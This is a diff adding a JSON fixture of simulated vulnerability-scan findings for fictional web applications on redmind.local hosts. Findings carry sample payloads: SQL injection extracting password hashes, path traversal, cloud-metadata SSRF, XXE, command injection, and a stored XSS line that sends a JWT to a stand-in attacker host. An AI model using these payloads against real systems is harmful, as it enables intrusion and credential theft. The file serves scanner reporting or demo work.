@@ -1,0 +1,1212 @@
+{
+  "targets": {
+    "acme-retail": {
+      "label": "acme-retail.redmind.local",
+      "description": "E-commerce platform (PHP/Laravel)",
+      "findings": [
+        {
+          "moduleId": "RM-CHK-002",
+          "severity": "CRITICAL",
+          "findings": [
+            {
+              "param": "id",
+              "payload": "' OR 1=1 --",
+              "url": "https://acme-retail.redmind.local/products?id=1",
+              "evidence": "MySQL error: You have an error in your SQL syntax near '''"
+            }
+          ],
+          "summary": {
+            "tested_requests": 48,
+            "positive_hits": 3
+          }
+        },
+        {
+          "moduleId": "RM-CHK-055",
+          "severity": "CRITICAL",
+          "findings": [
+            {
+              "url": "https://acme-retail.redmind.local/_ignition/execute-solution",
+              "evidence": "Laravel debug mode active — stack traces exposed to public",
+              "detail": "APP_DEBUG=true detected in error response"
+            }
+          ],
+          "summary": {
+            "tested_requests": 4,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-041",
+          "severity": "CRITICAL",
+          "findings": [
+            {
+              "url": "https://acme-retail.redmind.local/upload",
+              "evidence": "Uploaded file 'shell.php' returned HTTP 200; file accessible at /uploads/shell.php",
+              "detail": "No MIME validation or extension whitelist enforced"
+            }
+          ],
+          "summary": {
+            "tested_requests": 12,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-003",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "param": "search",
+              "payload": "<script>alert(document.cookie)</script>",
+              "url": "https://acme-retail.redmind.local/search?q=<script>alert(1)</script>",
+              "evidence": "Payload reflected unescaped in response body"
+            }
+          ],
+          "summary": {
+            "tested_requests": 30,
+            "positive_hits": 2
+          }
+        },
+        {
+          "moduleId": "RM-CHK-008",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "cookie": "session_id",
+              "flags_missing": [
+                "HttpOnly",
+                "Secure",
+                "SameSite"
+              ],
+              "evidence": "Set-Cookie: session_id=abc123; Path=/"
+            }
+          ],
+          "summary": {
+            "tested_requests": 6,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-010",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "path": "/.env",
+              "status": 200,
+              "evidence": "APP_KEY, DB_PASSWORD, MAIL_PASSWORD exposed"
+            },
+            {
+              "path": "/storage/logs/laravel.log",
+              "status": 200,
+              "evidence": "Full application log with stack traces accessible"
+            }
+          ],
+          "summary": {
+            "tested_requests": 80,
+            "positive_hits": 2
+          }
+        },
+        {
+          "moduleId": "RM-CHK-052",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "plugin": "woocommerce",
+              "installed_version": "7.1.0",
+              "latest_version": "8.4.0",
+              "cve": "CVE-2023-34000"
+            },
+            {
+              "plugin": "contact-form-7",
+              "installed_version": "5.6.0",
+              "latest_version": "5.9.1",
+              "cve": "CVE-2023-6449"
+            }
+          ],
+          "summary": {
+            "tested_requests": 15,
+            "positive_hits": 2
+          }
+        },
+        {
+          "moduleId": "RM-CHK-007",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "header": "X-Frame-Options",
+              "evidence": "Header absent — site is embeddable in iframes (clickjacking risk)"
+            }
+          ],
+          "summary": {
+            "tested_requests": 3,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-017",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "header": "Access-Control-Allow-Origin",
+              "value": "*",
+              "evidence": "Wildcard CORS allows any origin to read authenticated responses"
+            }
+          ],
+          "summary": {
+            "tested_requests": 5,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-046",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "endpoint": "/api/v1/login",
+              "evidence": "1000 requests/min accepted without throttle or lockout"
+            }
+          ],
+          "summary": {
+            "tested_requests": 200,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-005",
+          "severity": "LOW",
+          "findings": [
+            {
+              "path": "/uploads/",
+              "evidence": "Directory listing enabled — all uploaded files browseable"
+            }
+          ],
+          "summary": {
+            "tested_requests": 10,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-009",
+          "severity": "LOW",
+          "findings": [
+            {
+              "header": "Server",
+              "value": "Apache/2.4.51 (Ubuntu)",
+              "evidence": "Server version disclosed in response header"
+            }
+          ],
+          "summary": {
+            "tested_requests": 2,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-036",
+          "severity": "INFO",
+          "findings": [
+            {
+              "port": 22,
+              "service": "SSH",
+              "banner": "OpenSSH_8.2p1"
+            },
+            {
+              "port": 80,
+              "service": "HTTP",
+              "banner": "Apache/2.4.51"
+            },
+            {
+              "port": 443,
+              "service": "HTTPS",
+              "banner": "Apache/2.4.51"
+            },
+            {
+              "port": 3306,
+              "service": "MySQL",
+              "banner": "8.0.31",
+              "note": "Port exposed to internet"
+            }
+          ],
+          "summary": {
+            "tested_requests": 1000,
+            "positive_hits": 4
+          }
+        }
+      ]
+    },
+    "securebank-api": {
+      "label": "securebank-api.redmind.local",
+      "description": "Banking portal (Java Spring Boot)",
+      "findings": [
+        {
+          "moduleId": "RM-CHK-044",
+          "severity": "CRITICAL",
+          "findings": [
+            {
+              "url": "https://securebank-api.redmind.local/js/main.bundle.js",
+              "key_type": "AWS Access Key",
+              "evidence": "AKIA[REDACTED] hardcoded in client-side bundle",
+              "detail": "Key validated active via AWS STS GetCallerIdentity"
+            }
+          ],
+          "summary": {
+            "tested_requests": 8,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-018",
+          "severity": "CRITICAL",
+          "findings": [
+            {
+              "param": "doc",
+              "payload": "../../../../etc/passwd",
+              "url": "https://securebank-api.redmind.local/download?doc=../../../../etc/passwd",
+              "evidence": "root:x:0:0:root:/root:/bin/bash returned in response"
+            }
+          ],
+          "summary": {
+            "tested_requests": 40,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-050",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "endpoint": "/api/accounts/{id}/transactions",
+              "evidence": "Authenticated as user 1041, accessed account 1099's transaction list — HTTP 200 returned",
+              "detail": "Object-level authorisation not enforced on account ID parameter"
+            }
+          ],
+          "summary": {
+            "tested_requests": 20,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-045",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "endpoint": "/api/admin/users",
+              "evidence": "Returns full user list without authentication (HTTP 200)"
+            },
+            {
+              "endpoint": "/api/admin/audit-log",
+              "evidence": "Returns audit log entries without authentication (HTTP 200)"
+            }
+          ],
+          "summary": {
+            "tested_requests": 50,
+            "positive_hits": 2
+          }
+        },
+        {
+          "moduleId": "RM-CHK-014",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "protocol": "TLSv1.0",
+              "cipher": "TLS_RSA_WITH_RC4_128_SHA",
+              "evidence": "TLS 1.0 and RC4 cipher suites accepted — deprecated, vulnerable to BEAST/POODLE"
+            }
+          ],
+          "summary": {
+            "tested_requests": 15,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-049",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "endpoint": "/api/profile/update",
+              "payload": "{ \"role\": \"admin\", \"balance\": 999999 }",
+              "evidence": "Extra fields accepted and applied — balance set to 999999 in response"
+            }
+          ],
+          "summary": {
+            "tested_requests": 12,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-004",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "param": "return_url",
+              "payload": "https://attacker.redmind.local",
+              "url": "https://securebank-api.redmind.local/auth/callback?return_url=https://attacker.redmind.local",
+              "evidence": "Redirected to attacker-controlled domain without validation"
+            }
+          ],
+          "summary": {
+            "tested_requests": 20,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-013",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "header": "Strict-Transport-Security",
+              "evidence": "HSTS header absent — downgrade attacks possible"
+            }
+          ],
+          "summary": {
+            "tested_requests": 3,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-037",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "host": "securebank-api.redmind.local",
+              "expiry": "2024-03-15T00:00:00Z",
+              "days_remaining": -120,
+              "evidence": "SSL certificate expired 120 days ago"
+            }
+          ],
+          "summary": {
+            "tested_requests": 2,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-006",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "method": "TRACE",
+              "evidence": "TRACE method enabled — XST attack vector"
+            },
+            {
+              "method": "DELETE",
+              "evidence": "DELETE method accepted on /api/accounts endpoint"
+            }
+          ],
+          "summary": {
+            "tested_requests": 8,
+            "positive_hits": 2
+          }
+        },
+        {
+          "moduleId": "RM-CHK-036",
+          "severity": "INFO",
+          "findings": [
+            {
+              "port": 22,
+              "service": "SSH"
+            },
+            {
+              "port": 443,
+              "service": "HTTPS"
+            },
+            {
+              "port": 8080,
+              "service": "HTTP-ALT",
+              "note": "Spring Boot actuator on 8080 — /actuator/env exposed"
+            },
+            {
+              "port": 5432,
+              "service": "PostgreSQL",
+              "note": "Database port reachable from internet"
+            }
+          ],
+          "summary": {
+            "tested_requests": 1000,
+            "positive_hits": 4
+          }
+        }
+      ]
+    },
+    "content-hub": {
+      "label": "content-hub.redmind.local",
+      "description": "WordPress blog (hardened)",
+      "findings": [
+        {
+          "moduleId": "RM-CHK-051",
+          "severity": "LOW",
+          "findings": [
+            {
+              "path": "/?feed=rss2",
+              "generator_tag": "WordPress 6.3.1",
+              "evidence": "Version disclosed in RSS generator meta tag"
+            }
+          ],
+          "summary": {
+            "tested_requests": 5,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-009",
+          "severity": "LOW",
+          "findings": [
+            {
+              "header": "X-Powered-By",
+              "value": "PHP/8.1.12",
+              "evidence": "PHP version disclosed in response header"
+            }
+          ],
+          "summary": {
+            "tested_requests": 2,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-048",
+          "severity": "LOW",
+          "findings": [
+            {
+              "endpoint": "/wp-json/wp/v2/users",
+              "evidence": "WordPress REST API exposes enumerable user list including display names and slugs"
+            }
+          ],
+          "summary": {
+            "tested_requests": 10,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-038",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "url": "https://content-hub.redmind.local/",
+              "mixed_content": "http://content-hub.redmind.local/wp-content/uploads/image.jpg",
+              "evidence": "Image loaded over HTTP within HTTPS page"
+            }
+          ],
+          "summary": {
+            "tested_requests": 20,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-007",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "header": "Content-Security-Policy",
+              "evidence": "CSP header absent — no XSS mitigation policy set"
+            }
+          ],
+          "summary": {
+            "tested_requests": 3,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-036",
+          "severity": "INFO",
+          "findings": [
+            {
+              "port": 80,
+              "service": "HTTP"
+            },
+            {
+              "port": 443,
+              "service": "HTTPS"
+            }
+          ],
+          "summary": {
+            "tested_requests": 1000,
+            "positive_hits": 2
+          }
+        }
+      ]
+    },
+    "healthcare-patient-portal": {
+      "label": "healthcare-patient-portal.redmind.local",
+      "description": "Healthcare patient portal (Django/PostgreSQL)",
+      "findings": [
+        {
+          "moduleId": "RM-CHK-011",
+          "severity": "CRITICAL",
+          "findings": [
+            {
+              "param": "patient_id",
+              "payload": "1' UNION SELECT username,password FROM auth_user --",
+              "url": "https://healthcare-patient-portal.redmind.local/records?patient_id=1",
+              "evidence": "PostgreSQL UNION-based injection — hashed passwords extracted in response"
+            }
+          ],
+          "summary": {
+            "tested_requests": 64,
+            "positive_hits": 2
+          }
+        },
+        {
+          "moduleId": "RM-CHK-012",
+          "severity": "CRITICAL",
+          "findings": [
+            {
+              "url": "https://healthcare-patient-portal.redmind.local/media/backup.sql",
+              "evidence": "Full database dump accessible at /media/backup.sql (HTTP 200, 1.2GB)",
+              "detail": "Contains PHI, SSNs, and insurance policy numbers in plaintext"
+            }
+          ],
+          "summary": {
+            "tested_requests": 18,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-015",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "param": "redirect",
+              "payload": "//evil.com",
+              "url": "https://healthcare-patient-portal.redmind.local/login?redirect=//evil.com",
+              "evidence": "Open redirect validated — user token leaked to external domain via Referer"
+            }
+          ],
+          "summary": {
+            "tested_requests": 25,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-016",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "endpoint": "/api/v2/prescriptions/{id}",
+              "evidence": "Authenticated as patient 4421, retrieved prescription 8892 for patient 9921 — HTTP 200",
+              "detail": "No row-level security on prescription records"
+            }
+          ],
+          "summary": {
+            "tested_requests": 35,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-019",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "header": "Cache-Control",
+              "evidence": "No-store directive missing — medical records cached by browser (6MB response)"
+            },
+            {
+              "header": "Pragma",
+              "evidence": "Pragma: no-cache absent on /records endpoint"
+            }
+          ],
+          "summary": {
+            "tested_requests": 12,
+            "positive_hits": 2
+          }
+        },
+        {
+          "moduleId": "RM-CHK-020",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "header": "X-Content-Type-Options",
+              "evidence": "nosniff missing — MIME sniffing possible on uploaded scan documents"
+            }
+          ],
+          "summary": {
+            "tested_requests": 4,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-021",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "endpoint": "/api/v2/appointments",
+              "evidence": "CSRF token not validated on POST — appointment cancelled via forged request"
+            }
+          ],
+          "summary": {
+            "tested_requests": 15,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-022",
+          "severity": "LOW",
+          "findings": [
+            {
+              "path": "/static/admin/",
+              "evidence": "Django admin static files exposed — reveals Django 4.1.3 version"
+            }
+          ],
+          "summary": {
+            "tested_requests": 8,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-023",
+          "severity": "INFO",
+          "findings": [
+            {
+              "port": 22,
+              "service": "SSH",
+              "banner": "OpenSSH_9.0p1"
+            },
+            {
+              "port": 443,
+              "service": "HTTPS",
+              "banner": "nginx/1.22.1"
+            },
+            {
+              "port": 5432,
+              "service": "PostgreSQL",
+              "banner": "14.5",
+              "note": "Database exposed to VPN subnet, not internet"
+            }
+          ],
+          "summary": {
+            "tested_requests": 1000,
+            "positive_hits": 3
+          }
+        }
+      ]
+    },
+    "cloudvault-storage": {
+      "label": "cloudvault-storage.redmind.local",
+      "description": "Cloud file storage service (Node.js/Express)",
+      "findings": [
+        {
+          "moduleId": "RM-CHK-024",
+          "severity": "CRITICAL",
+          "findings": [
+            {
+              "url": "https://cloudvault-storage.redmind.local/api/files/upload",
+              "evidence": "SVG with embedded JavaScript uploaded and rendered inline — XSS via file preview",
+              "detail": "Content-type set to image/svg+xml, script executed in victim's session"
+            }
+          ],
+          "summary": {
+            "tested_requests": 22,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-025",
+          "severity": "CRITICAL",
+          "findings": [
+            {
+              "param": "url",
+              "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+              "url": "https://cloudvault-storage.redmind.local/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+              "evidence": "AWS IAM role credentials returned — SSRF to instance metadata service"
+            }
+          ],
+          "summary": {
+            "tested_requests": 55,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-026",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "endpoint": "/api/buckets/{bucketId}/files",
+              "evidence": "Accessed bucket 9921 (owned by org 44) as org 12 member — no tenant isolation",
+              "detail": "Multi-tenant authorization bypass via bucketId parameter"
+            }
+          ],
+          "summary": {
+            "tested_requests": 40,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-027",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "endpoint": "/api/share",
+              "payload": "{ \"file_id\": \"private_doc_001\", \"permissions\": [\"public_read\"] }",
+              "evidence": "Private file shared publicly without owner confirmation — signed URL generated"
+            }
+          ],
+          "summary": {
+            "tested_requests": 18,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-028",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "header": "Access-Control-Allow-Origin",
+              "value": "*",
+              "evidence": "Wildcard CORS on /api/files/download allows credentialed cross-origin requests"
+            }
+          ],
+          "summary": {
+            "tested_requests": 6,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-029",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "endpoint": "/api/auth/reset",
+              "evidence": "Password reset link sent to unverified email — no ownership check before token generation"
+            }
+          ],
+          "summary": {
+            "tested_requests": 14,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-030",
+          "severity": "LOW",
+          "findings": [
+            {
+              "header": "X-Powered-By",
+              "value": "Express/4.18.2",
+              "evidence": "Framework version disclosed in response header"
+            }
+          ],
+          "summary": {
+            "tested_requests": 3,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-031",
+          "severity": "INFO",
+          "findings": [
+            {
+              "port": 443,
+              "service": "HTTPS",
+              "banner": "nginx/1.24.0"
+            },
+            {
+              "port": 3000,
+              "service": "HTTP-ALT",
+              "note": "Node.js debug port exposed on 0.0.0.0:3000"
+            },
+            {
+              "port": 6379,
+              "service": "Redis",
+              "note": "Unauthenticated Redis 7.0.12 reachable from internal VPC"
+            }
+          ],
+          "summary": {
+            "tested_requests": 1000,
+            "positive_hits": 3
+          }
+        }
+      ]
+    },
+    "nexgen-hr-portal": {
+      "label": "nexgen-hr-portal.redmind.local",
+      "description": "Internal HR & payroll portal (ASP.NET Core)",
+      "findings": [
+        {
+          "moduleId": "RM-CHK-032",
+          "severity": "CRITICAL",
+          "findings": [
+            {
+              "param": "username",
+              "payload": "*)(objectClass=*)",
+              "url": "https://nexgen-hr-portal.redmind.local/api/auth/ldap",
+              "evidence": "LDAP injection — wildcard query returned all employee DNs and attributes"
+            }
+          ],
+          "summary": {
+            "tested_requests": 30,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-033",
+          "severity": "CRITICAL",
+          "findings": [
+            {
+              "url": "https://nexgen-hr-portal.redmind.local/api/payroll/export",
+              "evidence": "Unauthenticated bulk payroll export — 4,200 employee records including bank details returned",
+              "detail": "No API key or session token required for sensitive endpoint"
+            }
+          ],
+          "summary": {
+            "tested_requests": 10,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-034",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "endpoint": "/api/employees/{id}/payslips",
+              "evidence": "Authenticated as employee 1102, downloaded payslip for employee 009 (CEO) — HTTP 200",
+              "detail": "Insecure direct object reference on payslip ID"
+            }
+          ],
+          "summary": {
+            "tested_requests": 28,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-035",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "endpoint": "/api/reports/leave-balance",
+              "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">]><report>&xxe;</report>",
+              "evidence": "win.ini contents returned in XML report response — XXE vulnerability"
+            }
+          ],
+          "summary": {
+            "tested_requests": 16,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-039",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "endpoint": "/api/timesheets/submit",
+              "payload": "{ \"hours\": 999, \"approved_by\": \"admin\", \"status\": \"approved\" }",
+              "evidence": "Mass assignment — timesheet auto-approved via extra fields in JSON body"
+            }
+          ],
+          "summary": {
+            "tested_requests": 12,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-040",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "header": "X-Frame-Options",
+              "evidence": "ALLOW-FROM https://legacy-intranet.redmind.local — clickjacking possible from whitelisted domain"
+            }
+          ],
+          "summary": {
+            "tested_requests": 4,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-042",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "endpoint": "/api/auth/saml",
+              "evidence": "SAML response signature not validated — forged assertion accepted"
+            }
+          ],
+          "summary": {
+            "tested_requests": 20,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-043",
+          "severity": "LOW",
+          "findings": [
+            {
+              "path": "/swagger/v1/swagger.json",
+              "evidence": "Full API spec exposed including internal admin endpoints and schema definitions"
+            }
+          ],
+          "summary": {
+            "tested_requests": 6,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-047",
+          "severity": "INFO",
+          "findings": [
+            {
+              "port": 443,
+              "service": "HTTPS",
+              "banner": "Microsoft-IIS/10.0"
+            },
+            {
+              "port": 5985,
+              "service": "WinRM",
+              "note": "Windows Remote Management exposed to internal subnet"
+            }
+          ],
+          "summary": {
+            "tested_requests": 1000,
+            "positive_hits": 2
+          }
+        }
+      ]
+    },
+    "logistics-tracker": {
+      "label": "logistics-tracker.redmind.local",
+      "description": "Logistics & fleet tracking API (Go/Gin)",
+      "findings": [
+        {
+          "moduleId": "RM-CHK-053",
+          "severity": "CRITICAL",
+          "findings": [
+            {
+              "param": "cmd",
+              "payload": ";cat /etc/passwd",
+              "url": "https://logistics-tracker.redmind.local/api/fleet/diagnostics?cmd=;cat%20/etc/passwd",
+              "evidence": "Command injection in diagnostics endpoint — root shell obtained via reverse connection"
+            }
+          ],
+          "summary": {
+            "tested_requests": 45,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-054",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "endpoint": "/api/v1/shipments/{trackingId}",
+              "evidence": "Tracking ID SHP-9999-CEO returned full sender/receiver PII without authentication",
+              "detail": "No auth required for shipment lookup endpoint"
+            }
+          ],
+          "summary": {
+            "tested_requests": 60,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-056",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "endpoint": "/api/v1/vehicles/{vin}/location",
+              "evidence": "Real-time GPS coordinates returned for all fleet vehicles (lat/long precision to 6 decimals)"
+            }
+          ],
+          "summary": {
+            "tested_requests": 25,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-057",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "endpoint": "/api/v1/routes",
+              "evidence": "GraphQL introspection enabled — full schema with admin mutations exposed"
+            }
+          ],
+          "summary": {
+            "tested_requests": 8,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-058",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "header": "X-RateLimit-Remaining",
+              "evidence": "Rate limit header absent — 10,000 tracking requests/min accepted without blocking"
+            }
+          ],
+          "summary": {
+            "tested_requests": 150,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-059",
+          "severity": "LOW",
+          "findings": [
+            {
+              "header": "Server",
+              "value": "Go-http-server/1.21.0",
+              "evidence": "Go runtime version disclosed — known CVE-2023-39323 affects this branch"
+            }
+          ],
+          "summary": {
+            "tested_requests": 4,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-060",
+          "severity": "INFO",
+          "findings": [
+            {
+              "port": 443,
+              "service": "HTTPS",
+              "banner": "nginx/1.25.2"
+            },
+            {
+              "port": 8080,
+              "service": "Prometheus",
+              "note": "/metrics endpoint exposed with application-level metrics"
+            }
+          ],
+          "summary": {
+            "tested_requests": 1000,
+            "positive_hits": 2
+          }
+        }
+      ]
+    },
+    "edtech-lms": {
+      "label": "edtech-lms.redmind.local",
+      "description": "EdTech learning management system (Ruby on Rails)",
+      "findings": [
+        {
+          "moduleId": "RM-CHK-061",
+          "severity": "CRITICAL",
+          "findings": [
+            {
+              "param": "course_id",
+              "payload": "1) UNION SELECT email,encrypted_password FROM users--",
+              "url": "https://edtech-lms.redmind.local/courses/enroll?course_id=1",
+              "evidence": "SQLite UNION injection in enrollment query — bcrypt hashes exfiltrated"
+            }
+          ],
+          "summary": {
+            "tested_requests": 38,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-062",
+          "severity": "CRITICAL",
+          "findings": [
+            {
+              "url": "https://edtech-lms.redmind.local/rails/active_storage/disk/eyJfcmFpbH.../secret_syllabus.pdf",
+              "evidence": "Active Storage direct disk URL accessible without authentication — bypasses authorization checks",
+              "detail": "Signed ID not validated against session permissions"
+            }
+          ],
+          "summary": {
+            "tested_requests": 14,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-063",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "endpoint": "/api/v1/grades/{student_id}",
+              "evidence": "Authenticated as student 441, accessed grades for student 001 (dean's list) — HTTP 200",
+              "detail": "Missing authorization check on grade record access"
+            }
+          ],
+          "summary": {
+            "tested_requests": 22,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-064",
+          "severity": "HIGH",
+          "findings": [
+            {
+              "param": "content",
+              "payload": "<img src=x onerror=fetch('https://attacker.redmind.local/?c='+localStorage.getItem('jwt'))>",
+              "url": "https://edtech-lms.redmind.local/discussions/post",
+              "evidence": "Stored XSS — payload persisted and executed in instructor dashboard context"
+            }
+          ],
+          "summary": {
+            "tested_requests": 30,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-065",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "header": "Referrer-Policy",
+              "evidence": "Referrer-Policy absent — JWT token leaked to third-party analytics via Referer header"
+            }
+          ],
+          "summary": {
+            "tested_requests": 5,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-066",
+          "severity": "MEDIUM",
+          "findings": [
+            {
+              "endpoint": "/api/v1/assignments",
+              "evidence": "Insecure deserialization — YAML payload accepted in assignment metadata, remote code execution possible"
+            }
+          ],
+          "summary": {
+            "tested_requests": 18,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-067",
+          "severity": "LOW",
+          "findings": [
+            {
+              "path": "/assets/manifest.json",
+              "evidence": "Rails asset manifest exposes fingerprinted filenames and S3 bucket paths"
+            }
+          ],
+          "summary": {
+            "tested_requests": 7,
+            "positive_hits": 1
+          }
+        },
+        {
+          "moduleId": "RM-CHK-068",
+          "severity": "INFO",
+          "findings": [
+            {
+              "port": 443,
+              "service": "HTTPS",
+              "banner": "nginx/1.22.1"
+            },
+            {
+              "port": 3000,
+              "service": "Rails",
+              "note": "Rails console accessible via /console in development mode"
+            }
+          ],
+          "summary": {
+            "tested_requests": 1000,
+            "positive_hits": 2
+          }
+        }
+      ]
+    }
+  },
+  "moduleDelays": {
+    "CRITICAL": 1800,
+    "HIGH": 1400,
+    "MEDIUM": 900,
+    "LOW": 500,
+    "INFO": 300,
+    "default": 400
+  }
+}
